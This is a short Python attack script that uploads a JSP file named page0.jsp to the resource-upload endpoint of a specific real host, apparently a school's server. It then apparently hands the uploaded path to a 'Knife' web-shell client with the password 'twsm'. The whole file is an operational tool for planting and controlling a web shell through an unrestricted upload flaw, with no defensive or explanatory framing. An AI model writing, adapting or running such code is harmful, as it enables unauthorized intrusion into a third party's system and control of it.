import requests as r
from knife import Knife

host = '10.3.25.12'
host = 'aischool2.zzedu.net.cn'
url = f'http://{host}:8002/rescloud/resource/resourceFileUpload'

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2'"
}

def upload(url, content):
    a = r.post(url, headers=headers, files={'file':content})
    return a.text

def test():
    return upload(url, open('page0.jsp', 'rb'))

def equip(url):
    kf = Knife(url, 'twsm')
    kf.copy('')
